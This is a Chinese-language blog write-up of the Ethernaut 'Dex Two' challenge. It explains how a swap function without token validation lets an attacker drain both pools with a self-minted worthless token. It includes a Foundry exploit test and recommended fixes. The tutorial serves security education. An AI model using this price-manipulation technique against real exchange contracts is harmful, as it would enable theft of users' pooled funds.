---
title: 'Ethernaut Level 23: Dex Two - 任意代币对价格操纵'
date: 2025-01-25 17:00:00
updated: 2025-01-25 17:00:00
categories:
  - Ethernaut 系列
  - 高级攻击篇 (21-25)
tags:
  - Ethernaut
  - Foundry
  - DEX
  - Price Manipulation
  - Token Validation
  - 智能合约安全
series: Ethernaut Foundry Solutions
excerpt: "利用DEX合约中缺失的代币白名单验证，通过引入一个我们自己创建的、价值极低的代币来操纵交易对的价格。学习如何用一个毫无价值的代币换取池中所有有价值的代币，掌握 Dex Two 关卡的破解技巧。"
---

# 🎯 Ethernaut Level 23: Dex Two - 任意代币对价格操纵

> **关卡链接**: [Ethernaut Level 23 - Dex Two](https://ethernaut.openzeppelin.com/level/23)  
> **攻击类型**: 价格操纵 / 缺少输入验证  
> **难度**: ⭐⭐⭐☆☆

## 📋 挑战目标

与上一关类似，你需要与一个 `Dex` 合约交互。但这次的目标更具挑战性：你需要同时耗尽 `Dex` 合约中 `Token1` **和** `Token2` 的全部流动性。

-   **初始状态**: 
    -   Player: 10 TKN1, 10 TKN2
    -   Dex: 100 TKN1, 100 TKN2

![Dex Two Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel23.svg)

## 🔍 漏洞分析

`DexTwo` 合约的代码与上一关的 `Dex` 几乎完全相同，但有一个微小却致命的改动。在 `swap` 函数中，一行关键的验证代码被移除了：

```solidity
// This line was present in Dex, but is missing in DexTwo
// require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
```

这行代码原本用于确保交易只在 `token1` 和 `token2` 之间进行。由于它被移除了，`DexTwo` 的 `swap` 函数现在可以接受**任何**符合ERC20标准的代币作为交易对的一方。

这就为我们打开了攻击的大门。我们可以创建一个我们自己控制的、毫无价值的“攻击代币”（我们称之为 `Token3`），并用它来操纵与 `Token1` 和 `Token2` 的交易价格。

### 攻击流程

我们的策略是利用我们自己创建的 `Token3` 作为媒介，以极低的价格换取 `Dex` 池中所有的 `Token1` 和 `Token2`。

1.  **创建并分发攻击代币**: 我们创建一个新的ERC20代币 `Token3`，并给自己铸造大量的 `Token3`。

2.  **为 `Token3` 提供“流动性”**: 我们向 `DexTwo` 合约发送极少量的 `Token3`（例如，1个）。现在 `DexTwo` 合约中 `Token3` 的余额为1。

3.  **第一次交换 (Token3 -> Token1)**:
    *   我们现在用 `Token3` 交换 `Token1`。池中 `Token1` 的余额是100，`Token3` 的余额是1。价格比为 100:1。
    *   我们只需要发送1个 `Token3`，就可以根据价格公式换取 `(1 * 100) / 1 = 100` 个 `Token1`。
    *   交换后，`Dex` 池中的 `Token1` 被全部换走。

4.  **第二次交换 (Token3 -> Token2)**:
    *   现在池中 `Token2` 的余额是100，`Token3` 的余额是2（我们第一次交换时转入了1个，现在又转入了1个）。价格比为 100:2，即 50:1。
    *   我们发送2个 `Token3`，就可以换取 `(2 * 100) / 2 = 100` 个 `Token2`。
    *   交换后，`Dex` 池中的 `Token2` 也被全部换走。

通过引入一个我们完全控制的第三方代币，我们成功地操纵了价格，并用极小的代价（总共3个我们自己随意铸造的 `Token3`）清空了整个 `Dex` 池。

## 💻 Foundry 实现

### Foundry 测试代码

测试代码将模拟上述的攻击流程：创建新代币，并用它来耗尽 `DexTwo` 的流动性。

```solidity
// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/23_DexTwo.sol";

contract DexTwoTest is Test {
    DexTwo instance;
    address player;
    SwappableTokenTwo token1;
    SwappableTokenTwo token2;

    function setUp() public {
        player = vm.addr(1);
        instance = new DexTwo();

        // 部署并设置初始代币
        token1 = new SwappableTokenTwo(address(instance), "Token 1", "TKN1", 110);
        token2 = new SwappableTokenTwo(address(instance), "Token 2", "TKN2", 110);
        instance.setTokens(address(token1), address(token2));

        // 添加流动性并发送初始代币给 player
        token1.approve(address(instance), 100);
        token2.approve(address(instance), 100);
        instance.add_liquidity(address(token1), 100);
        instance.add_liquidity(address(token2), 100);
        token1.transfer(player, 10);
        token2.transfer(player, 10);
    }

    function testDexTwoAttack() public {
        vm.startPrank(player);

        // 1. 部署我们自己的恶意代币
        SwappableTokenTwo attackToken = new SwappableTokenTwo(address(instance), "Attack Token", "ATK", 400);
        attackToken.approve(address(instance), type(uint256).max);

        // 2. 向 Dex 提供极少量的恶意代币流动性
        attackToken.transfer(address(instance), 1);

        // 3. 用1个恶意代币换走所有 Token1
        uint256 dexT1Balance = token1.balanceOf(address(instance));
        uint256 swapAmount1 = instance.get_swap_price(address(attackToken), address(token1), 1);
        assertEq(swapAmount1, dexT1Balance, "Price should allow draining Token1");
        instance.swap(address(attackToken), address(token1), 1);

        // 4. 用2个恶意代币换走所有 Token2
        uint256 dexT2Balance = token2.balanceOf(address(instance));
        uint256 swapAmount2 = instance.get_swap_price(address(attackToken), address(token2), 2);
        assertEq(swapAmount2, dexT2Balance, "Price should allow draining Token2");
        instance.swap(address(attackToken), address(token2), 2);

        // 5. 验证 Dex 的两种代币都已被耗尽
        bool drained = token1.balanceOf(address(instance)) == 0 && token2.balanceOf(address(instance)) == 0;
        assertTrue(drained, "Dex should be drained of both tokens");

        vm.stopPrank();
    }
}
```

### 关键攻击步骤

1.  **识别漏洞**: 发现 `swap` 函数缺少对交易代币的白名单验证。
2.  **创建攻击代币**: 部署一个我们自己控制的ERC20代币。
3.  **注入虚假流动性**: 向 `DexTwo` 合约发送极少量的攻击代币，以建立一个极不平衡的交易对。
4.  **耗尽Token1**: 用少量攻击代币交换 `DexTwo` 中所有的 `Token1`。
5.  **耗尽Token2**: 再次用少量攻击代币交换 `DexTwo` 中所有的 `Token2`。

## 🛡️ 防御措施

1.  **严格的输入验证**: 这是最关键的防御措施。合约必须严格验证所有外部输入，特别是那些决定核心逻辑的参数，如本例中的代币地址。

    ```solidity
    // 修复建议：加回被移除的验证
    function swap(address from, address to, uint amount) public {
        require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
        // ... a reste of the swap logic
    }
    ```

2.  **使用白名单**: 对于允许哪些代币参与交互的系统，应维护一个可信代币的白名单，并对所有传入的代币地址进行检查。

## 🔧 相关工具和技术

-   **输入验证**: 智能合约安全中最基本也是最重要的原则之一。永远不要相信来自外部的输入。
-   **代币白名单**: 一种常见的安全模式，用于限制系统只与预先批准的、受信任的代币合约进行交互。

## 🎯 总结

**核心概念**:
-   缺少对输入参数（如代币地址）的验证是一个严重的安全漏洞。
-   在去中心化交易所（DEX）中，如果允许任意代币参与交易，攻击者可以通过引入自己控制的代币来轻易地操纵价格。

**攻击向量**:
-   创建一个新的、由攻击者完全控制的ERC20代币。
-   将这个新代币与目标代币在一个缺乏验证的DEX中形成交易对。
-   利用极不平衡的流动性比例，以极低的价格换取所有目标代幣。

**防御策略**:
-   对所有函数的输入参数进行严格的白名单或有效性检查。
-   确保核心业务逻辑（如交易）只能在预期的、受信任的资产之间进行。

## 📚 参考资料

-   [SWC-107: Unchecked External Call](https://swcregistry.io/docs/SWC-107) (虽然本例是缺少验证，但根源都是对外部输入/合约的不信任)
-   [Secureum: Input Validation](https://secureum.substack.com/p/security-pitfalls-and-best-practices-101)